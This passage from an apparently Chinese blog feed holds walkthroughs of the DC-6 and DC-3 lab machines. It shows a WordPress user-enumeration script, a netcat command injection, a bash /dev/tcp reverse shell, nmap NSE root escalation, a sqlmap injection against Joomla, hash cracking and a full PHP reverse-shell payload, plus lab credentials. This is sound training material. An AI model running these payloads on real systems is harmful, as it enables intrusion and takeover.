<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        geturl = url + <span class="string">"?author=&#123;&#125;"</span>.format(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">global</span> res</span><br><span class="line">            res = requests.get(geturl,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>).content</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> str(e)</span><br><span class="line"></span><br><span class="line">        p = re.compile(<span class="string">r'&lt;body class="archive author author-(.+?) author-'</span>)</span><br><span class="line">        matchs = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matchs = p.findall(res.decode())</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            matchs = p.findall(res)</span><br><span class="line">        fp = open(<span class="string">'auth.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">for</span> auth <span class="keyword">in</span> matchs:</span><br><span class="line">            print(<span class="string">'\033[33m author: '</span> + auth + <span class="string">'\033[0m'</span>)</span><br><span class="line">            fp.write(auth + <span class="string">'\n'</span>)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'\033[32m [+] The results are saved in auth.txt. \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    _argv = sys.argv</span><br><span class="line">    <span class="keyword">if</span> len(_argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'\033[31m [-] Please enter the URL to enumerate. \033[0m'</span>);</span><br><span class="line">        print(<span class="string">'\033[35m template: ./author.py http://www.wordpress.com. \033[0m'</span>)</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    getAuthor(_argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><ul><li><p>我们可以得到一个auth.txt的文件</p></li><li><p>用来做用户名的字典</p></li><li><p>还有上面线索说的:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat/usr/share/wordlists/rockyou.txt | grep k01&gt;passwords.txt</span><br></pre></td></tr></table></figure><ul><li><p>执行这个可以得到一个密码字典</p></li><li><p>用<code>burpsuite</code>去给他爆破</p></li><li><p>然后就得到了一个账号和密码:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:mark </span><br><span class="line">passwd:helpdesk01</span><br></pre></td></tr></table></figure><ul><li><p>进后台之后</p></li><li><p>发现没啥权限</p></li><li><p>只能操作一个插件: <code>Activity</code></p></li><li><p>找想办法拿shell</p></li><li><p>先看看有没有框架漏洞 :<code>searchsploit wordpress Activity</code> </p></li><li><p>找到一些跨站脚本攻击和一个命令注入</p></li><li><p>这里我就用命令注入:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | </span><br><span class="line">exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure><ul><li><p>看了些<code>45274.html</code>这个文件说是在</p></li><li><p><a href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools页面下" target="_blank" rel="noopener">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools页面下</a> </p></li><li><p>IP输入框存在命令注入 但是IP输入框的最大长度只有15,这时候可以抓包去改了</p></li><li><p>在参数填入 <code>0.0.0.0 | nc -lvp 6666 -e /bin/bash</code></p></li><li><p>然后kali用nc去连接就可以得到shell了</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.141 6666 <span class="comment">#nc连接</span></span><br><span class="line"><span class="comment"># 获得交互式shell</span></span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure><ul><li><p>我们先看看有哪些用户 <code>cat /etc/passwd</code></p></li><li><p>发现4个自建用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graham:x:1001:1001:Graham,,,:/home/graham:/bin/bash</span><br><span class="line">mark:x:1002:1002:Mark,,,:/home/mark:/bin/bash</span><br><span class="line">sarah:x:1003:1003:Sarah,,,:/home/sarah:/bin/bash</span><br><span class="line">jens:x:1004:1004:Jens,,,:/home/jens:/bin/bash</span><br></pre></td></tr></table></figure></li><li><p>去各自的用户目录下看看</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens;ls -l /home/sarah;ls -l /home/mark;ls -l /home/graham</span><br><span class="line">&lt; -l /home/sarah;ls -l /home/mark;ls -l /home/graham</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxr-x 1 jens devs 56 Apr 26 00:01 backups.sh</span><br><span class="line">total 0</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuff</span><br><span class="line">total 0</span><br><span class="line"><span class="comment"># 看到jens下面有个backups.sh文件</span></span><br><span class="line"><span class="comment"># mark有个stuff文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /home/mark/stuff;ls</span><br><span class="line">things-to-do.txt</span><br><span class="line"><span class="comment">#看到有个 things-to-do.txt 文件</span></span><br><span class="line">cat things-to-do.txt</span><br><span class="line"></span><br><span class="line">Things to <span class="keyword">do</span>:</span><br><span class="line"></span><br><span class="line">- Restore full functionality <span class="keyword">for</span> the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present <span class="keyword">for</span> Sarah<span class="string">'s farewell party</span></span><br><span class="line"><span class="string">- Add new user: graham - GSo7isUM1D4 - done</span></span><br><span class="line"><span class="string">- Apply for the OSCP course</span></span><br><span class="line"><span class="string">- Buy new laptop for Sarah'</span>s replacement</span><br><span class="line"></span><br><span class="line">要做的事情：</span><br><span class="line">-恢复超光驱的全部功能（需要与Jens通话）</span><br><span class="line">-为莎拉的告别会买礼物</span><br><span class="line">-添加新用户：graham-GSo7isUM1D4——完成</span><br><span class="line">-申请OSCP课程</span><br><span class="line">-为莎拉的替代品购买新的笔记本电脑</span><br></pre></td></tr></table></figure><ul><li><p>找到graham的密码,并且开了22端口,我们用ssh登录试试</p></li><li><p>graham用户目录我们已经看了,啥也没有</p></li><li><p>看看计划任务:<code>crontab -l</code>  &gt;&gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>history</code>  &gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>sudo -l</code></p></li><li><p>找到一条</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User graham may run the following commands on dc-6:</span><br><span class="line">(jens) NOPASSWD: /home/jens/backups.sh</span><br></pre></td></tr></table></figure><ul><li><p>可以不要密码执行 <code>/home/jens/backups.sh</code></p></li><li><p>发现里面是打包网站的,我们让他去反弹一个shell</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'bash -i &gt;&amp; /dev/tcp/192.168.0.21/4444 0&gt;&amp;1'</span> &gt;  /home/jens/backups.sh</span><br></pre></td></tr></table></figure><ul><li>再去执行它</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure><ul><li><p>看看计划任务:<code>crontab -l</code>  &gt;&gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>history</code>  &gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>sudo -l</code></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">(root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure><ul><li><p>可以用以root的身份无密码执行nmap</p></li><li><p>nmap可以执行nse文件</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'os.execute("/bin/bash")'</span> &gt; /tmp/nmap.nse</span><br><span class="line">sudo nmap --script /tmp/nmap.nse</span><br></pre></td></tr></table></figure><ul><li>接着就得到了一个<code>rootshell</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@dc-6:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment">#直接获得flag</span></span><br><span class="line">cat ~/$(<span class="built_in">cd</span> ~;ls)</span><br></pre></td></tr></table></figure><ul><li><p>其实在网站配置文件里面还有数据库的账号密码…里面的密码太难了不会搞</p></li><li><p>找到了生成密码的文件,发现的每次都不一样,不知道怎么破解</p></li></ul><h2><span id="2-重要信息">2. 重要信息:</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. 网站后台账号密码:</span></span><br><span class="line">user: mark </span><br><span class="line">passwd: helpdesk01</span><br><span class="line"><span class="comment">#2. ssh账号密码:</span></span><br><span class="line">user: graham</span><br><span class="line">passwd: GSo7isUM1D4</span><br><span class="line"><span class="comment">#3.数据库和账号密码：</span></span><br><span class="line">user: wpdbuser </span><br><span class="line">passwd: meErKatZ </span><br><span class="line">DBName: wordpressdb</span><br></pre></td></tr></table></figure><h2><span id="theend~"><strong><del>THE</del>END~</strong></span></h2>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc-6靶机渗透&quot;&gt;DC-6靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1渗透过程&quot;&gt;1.渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-重要信息&quot;&gt;2. 重要信息:&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#__~the~end~__&quot;&gt;&lt;strong&gt;&lt;del&gt;THE&lt;/del&gt;END~&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DC-3 靶机渗透</title>
    <link href="https://atc96.top/DC-3/"/>
    <id>https://atc96.top/DC-3/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T09:57:47.685Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc-3靶机渗透">DC-3靶机渗透</a><ul><li><a href="#1-渗透过程">1. 渗透过程</a><ul><li><a href="#welcome-to-dc-3">Welcome to DC-3.</a></li><li><a href="#欢迎来到dc-3">欢迎来到DC-3。</a></li></ul></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc-3靶机渗透">DC-3靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul><li>先发现主机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># arp-scan 192.168.0.1/24</span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:f9:47:54, IPv4: 192.168.0.21</span><br><span class="line">WARNING: host part of 192.168.0.1/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1     04:95:e6:0f:a2:10       Tenda Technology Co.,Ltd.Dongguan branch</span><br><span class="line">192.168.0.22    00:0c:29:a9:c5:31       VMware, Inc.</span><br><span class="line">192.168.0.109   dc:8b:28:00:fa:32       Intel Corporate</span><br></pre></td></tr></table></figure><ul><li><p>得到ip: <code>192.168.0.22</code></p></li><li><p>探测端口: </p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sT -v -p- 192.168.0.22</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-29 15:41 CST</span><br><span class="line">Initiating ARP Ping Scan at 15:41</span><br><span class="line">Scanning 192.168.0.22 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 15:41, 0.04s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 15:41</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 15:41, 0.03s elapsed</span><br><span class="line">Initiating Connect Scan at 15:41</span><br><span class="line">Scanning 192.168.0.22 [65535 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.0.22</span><br><span class="line">Completed Connect Scan at 15:41, 1.90s elapsed (65535 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.22</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:A9:C5:31 (VMware)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.18 seconds</span><br><span class="line">           Raw packets sent: 1 (28B) | Rcvd: 1 (28B)</span><br></pre></td></tr></table></figure><ul><li><p>只有80端口</p></li><li><p>现进去看看</p></li><li><blockquote><h3><span id="welcome-to-dc-3">Welcome to DC-3.</span></h3><p>  This time, there is only one flag, one entry point and no clues.</p><p>  To get the flag, you’ll obviously have to gain root privileges.</p><p>  How you get to be root is up to you - and, obviously, the system.</p><p>  Good luck - and I hope you enjoy this little challenge. :-)</p><h3><span id="欢迎来到dc-3">欢迎来到DC-3。</span></h3><p>  这次，只有一个flag，一个入口点，没有任何线索。</p><p>  要获得标志，显然必须获得root权限。</p><p>  你是如何成为根的取决于你-很明显，还有系统。</p><p>  祝你好运-我希望你喜欢这个小挑战。:-)</p></blockquote></li><li><p>只有一个入口点？</p></li><li><p>页面也有一个登陆框</p></li><li><p>八成是突破这个登录框了</p></li><li><p>想看看网站的信息：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># whatweb http://192.168.0.22/</span></span><br><span class="line">http://192.168.0.22/ [200 OK] Apache[2.4.18], Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.0.22], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]</span><br></pre></td></tr></table></figure><ul><li><p>发现是Joomla框架</p></li><li><p>先扫描一下框架版本</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.0.22/</span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing :</span><br><span class="line">http://192.168.0.22/administrator/components</span><br><span class="line">http://192.168.0.22/administrator/modules</span><br><span class="line">http://192.168.0.22/administrator/templates</span><br><span class="line">http://192.168.0.22/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.0.22/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is not found</span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name</span><br><span class="line">[++] error <span class="built_in">log</span> is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config files are not found</span><br><span class="line">Your Report : reports/192.168.0.22/</span><br></pre></td></tr></table></figure><ul><li><p>发现版本：Joomla 3.7.0 和后台地址 <a href="http://192.168.0.22/administrator/" target="_blank" rel="noopener">http://192.168.0.22/administrator/</a></p></li><li><p>先看看有没有框架漏洞</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit Joomla 3.7.0</span></span><br><span class="line">----------------------------------------------------------------------------------- </span><br><span class="line">   Exploit Title  |  Path                                                             | (/usr/share/exploitdb/)               </span><br><span class="line">----------------------------------------------------------------------------------- </span><br><span class="line">Joomla! 3.7.0 - <span class="string">'com_fields'</span> SQL Injection  | exploits/php/webapps/42033.txt       </span><br><span class="line">-----------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><ul><li><p>有个sql注入</p></li><li><p>看看他注入点</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br><span class="line"></span><br><span class="line">Using Sqlmap:</span><br><span class="line">sqlmap -u <span class="string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><ul><li>直接用sqlmap 跑就完了</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] --dbs</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"><span class="comment">#显然joomladb就是网站的数据库了 当然也可以跑出来</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] --current-db</span><br><span class="line">15:55:43] [INFO] fetching current database</span><br><span class="line">[15:55:43] [INFO] resumed: <span class="string">'joomladb'</span></span><br><span class="line">current database:    <span class="string">'joomladb'</span></span><br><span class="line"><span class="comment"># 列表名：</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb --tables</span><br><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">-----------------------</span><br><span class="line">| <span class="comment">#__users            |</span></span><br><span class="line">-----------------------</span><br><span class="line"><span class="comment"># 76个表就不都写出来了</span></span><br><span class="line"><span class="comment"># 列字段</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T <span class="string">"#__users"</span> -columns</span><br><span class="line"><span class="keyword">do</span> you want to use common column existence check? [y/N/q]</span><br><span class="line"><span class="comment">#这里选择yes 然后选择1</span></span><br><span class="line">Database: joomladb</span><br><span class="line">Table: <span class="comment">#__users</span></span><br><span class="line">[5 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br><span class="line"><span class="comment"># 列出来了字段,把数据爆出来</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T <span class="string">"#__users"</span> -C username,password --dump</span><br><span class="line">Database: joomladb</span><br><span class="line">Table: <span class="comment">#__users</span></span><br><span class="line">[1 entry]</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line"><span class="comment"># 用户名得到了，密码是加密的</span></span><br></pre></td></tr></table></figure><ul><li><p>这里可以用<code>john</code>来破解，也可以用 <code>brupsuite</code> 来爆破</p></li><li><p>我们就用 <code>john</code> 来破解吧</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span> &gt; /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="comment"># note: 用双引号要加 \$ 把 $转义掉</span></span><br><span class="line"><span class="comment">#接着就是 ：</span></span><br><span class="line">john /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="comment">#得到密码：snoopy</span></span><br></pre></td></tr></table></figure><ul><li><p>登录之后</p></li><li><p>在template里面添加了一个木马（文件名设置成了1.php）</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*&lt;?php /**/</span> error_reporting(<span class="number">0</span>); $ip = <span class="string">'192.168.0.21'</span>; $port = <span class="number">4444</span>; <span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; $s_type = <span class="string">'socket'</span>; &#125; <span class="keyword">if</span> (!$s_type) &#123; <span class="keyword">die</span>(<span class="string">'no socket funcs'</span>); &#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; &#125; <span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; $a = unpack(<span class="string">"Nlen"</span>, $len); $len = $a[<span class="string">'len'</span>]; $b = <span class="string">''</span>; <span class="keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; &#125; &#125; $GLOBALS[<span class="string">'msgsock'</span>] = $s; $GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; <span class="keyword">if</span> (extension_loaded(<span class="string">'suhosin'</span>) &amp;&amp; ini_get(<span class="string">'suhosin.executor.disable_eval'</span>)) &#123; $suhosin_bypass=create_function(<span class="string">''</span>, $b); $suhosin_bypass(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">eval</span>($b); &#125; <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><ul><li>然后用msf连接的</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span 